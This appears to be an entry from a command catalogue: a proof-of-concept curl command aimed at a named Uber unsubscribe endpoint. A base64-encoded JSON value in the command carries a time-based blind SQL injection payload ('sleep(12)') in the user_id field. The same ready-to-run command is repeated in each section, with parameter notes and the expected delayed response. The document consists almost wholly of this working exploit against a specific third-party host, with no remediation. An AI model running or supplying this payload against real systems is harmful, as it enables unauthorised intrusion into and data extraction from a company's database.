---
id: cmd-uber-poc-001
data: >-
  curl -G "http://sctrack.email.uber.com.cn/track/unsubscribe.do"
  --data-urlencode
  "p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ=="
tags:
  - sqli
  - poc
type: command
output: HTTP response with ~12-second delay
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.130Z'
verified: false
validated: true
submitted: true
---
# uber-unsubscribe-sqli-poc

## Command

```bash
curl -G "http://sctrack.email.uber.com.cn/track/unsubscribe.do" --data-urlencode "p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ=="
```

## Description

This command sends a GET request to the Uber unsubscribe endpoint with a base64-encoded JSON payload injecting a time-based SQL sleep payload into the user_id parameter to test for blind SQL injection vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | Treats the request as GET | Yes |
| `--data-urlencode` | URL-encodes the 'p' parameter | Yes |
| `p` | Base64-encoded JSON with injected SQL | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://sctrack.email.uber.com.cn/track/unsubscribe.do" --data-urlencode "p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ=="
```

### Advanced Usage

```bash
time curl -G "http://sctrack.email.uber.com.cn/track/unsubscribe.do" --data-urlencode "p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ=="
```

## Expected Output

A successful response (e.g., 200 OK or redirect) delayed by approximately 12 seconds, confirming the SQL injection via timing.

## Related

- [[Related Procedure: Test-Unsubscribe-Endpoint-for-SQL-Injection]]
